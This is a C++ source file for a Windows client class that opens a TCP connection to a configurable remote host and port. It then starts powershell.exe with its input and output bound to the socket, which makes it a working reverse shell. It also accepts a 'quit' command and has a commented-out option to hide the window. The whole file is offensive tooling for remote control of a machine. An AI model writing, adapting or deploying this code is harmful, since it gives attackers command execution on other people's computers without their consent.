#include "client.hpp"

Client::Client(const char* chost, unsigned short int cport) {
    server = chost;
    port = cport;
}

void Client::create_socket() {
    // create socket
    printf("\ncreating socket");
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (socket == INVALID_SOCKET) {
        printf("\nCould not create socket: %d", WSAGetLastError());
        closesocket(socket);
        WSACleanup();
    }
}

bool Client::connect_socket() {
    // declare connect type, host, port
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(server);

    // now connect
    printf("\nconnecting socket..");
    if ( WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR ) {
        printf("\nFailed: %d", WSAGetLastError());
        closesocket(socket);
        WSACleanup();
        return false;
    }
    else {
        return true;
    }
}

bool Client::check_connection() {
    // check if there is any connection at all
    printf("\nchecking reception");
    memset(rdata, 0, sizeof(rdata));
    int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);
    if (RecvCode <= 0) {
        printf("\nfailed");
        closesocket(socket);
        WSACleanup();
        return false;
    }
    else {
        printf("\nall good.");
        return true;
    }
}

int Client::start_shell() {
    TCHAR Process[256] = L"powershell.exe";
    STARTUPINFO sinfo = { 0 };
    PROCESS_INFORMATION pinfo;
    
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    // window configuration
    //sinfo.wShowWindow = SW_HIDE;
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    // all below are equal to socket
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;

    // starting powershell
    printf("\nstarting powershell.exe as shell\n");
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    // the errors above will only show for vs, use mingw thats what i did because my vs gives runtimes errors
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    return 0;
}

int Client::receive_commands() {
    memset(rdata, 0, sizeof(rdata));
    int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);

    // exit command
    if (RecvCode <= 0) {
        closesocket(socket);
        WSACleanup();
        return RecvCode;
    }
    if (strcmp(rdata, "quit\n") == 0) {
        exit(0);
    }
    return 1;
}
